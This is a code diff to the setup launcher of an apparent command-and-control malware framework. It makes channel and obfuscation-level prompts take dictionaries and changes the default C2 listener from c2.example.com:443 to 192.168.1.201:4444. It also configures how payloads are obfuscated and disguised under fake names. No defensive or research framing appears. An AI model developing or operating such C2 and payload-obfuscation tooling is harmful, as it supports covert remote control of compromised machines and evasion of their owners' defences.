@@ -153,14 +153,14 @@ class IntegratedSetupLauncher:
         
         primary = self.prompt.prompt_choice(
             "Primary channel",
-            list(mc2.AVAILABLE_CHANNELS.keys()),
-            default=0
+            {k: v['name'] for k, v in mc2.AVAILABLE_CHANNELS.items()},
+            default=list(mc2.AVAILABLE_CHANNELS.keys())[0]
         )
         mc2.config['primary'] = primary
         
         print("\nConfigure HTTPS Direct channel:")
-        https_host = self.prompt.prompt_text("HTTPS Host", default="c2.example.com")
-        https_port = self.prompt.prompt_text("HTTPS Port", default="443")
+        https_host = self.prompt.prompt_text("HTTPS Host", default="192.168.1.201")
+        https_port = self.prompt.prompt_text("HTTPS Port", default="4444")
         
         mc2.configure_channel('https_direct', {
             'host': https_host,
@@ -185,13 +185,14 @@ class IntegratedSetupLauncher:
         print("  4. Maximum   - All techniques enabled")
         
         levels = ['minimal', 'normal', 'aggressive', 'maximum']
+        level_dict = {i: l.capitalize() for i, l in enumerate(levels)}
         choice = self.prompt.prompt_choice(
             "Select obfuscation level",
-            [l.capitalize() for l in levels],
-            default=2
+            level_dict,
+            default=1
         )
         
-        obf.set_level(levels[choice])
+        obf.set_level(levels[int(choice)])
         
         print("\n" + self.style.color("Payload Appearance:", 'bold'))
         fake_name = self.prompt.prompt_text(
